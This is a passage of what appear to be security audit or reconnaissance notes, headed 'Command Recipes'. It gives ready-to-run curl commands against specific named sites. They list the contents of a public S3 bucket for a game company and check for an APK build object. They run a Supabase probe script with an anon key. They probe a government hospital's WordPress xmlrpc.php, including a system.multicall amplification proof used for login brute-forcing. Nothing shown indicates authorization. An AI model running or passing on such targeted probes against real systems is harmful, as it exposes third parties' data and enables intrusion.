## 5) Command Recipes

## 5.1 Animeku Supabase probe
```bash
SUPABASE_ANON_KEY=<key> bash tools/animeku_audit.sh
```

## 5.2 CarX S3 proof
```bash
# bucket root
curl 'https://carx-store.s3.amazonaws.com/?delimiter=/'

# avatar prefix page
curl 'https://carx-store.s3.amazonaws.com/?prefix=prod/avatar/&delimiter=/&max-keys=1000'

# dr3 object check
curl -I 'https://carx-store.s3.amazonaws.com/prod/dr3-build-apk/[PROD]_CarXDriftRacing3_v.1.16.1_1992.apk'
```

## 5.3 Depok XML-RPC proof
```bash
# presence
curl -I 'https://rsudksa.depok.go.id/xmlrpc.php'

# wp.getUsersBlogs fault proof
curl -X POST 'https://rsudksa.depok.go.id/xmlrpc.php' -H 'Content-Type: text/xml' -d '<methodCall>...</methodCall>'

# multicall amplification proof (3-method)
curl -X POST 'https://rsudksa.depok.go.id/xmlrpc.php' -H 'Content-Type: text/xml' -d '<?xml ...system.multicall...>'
```

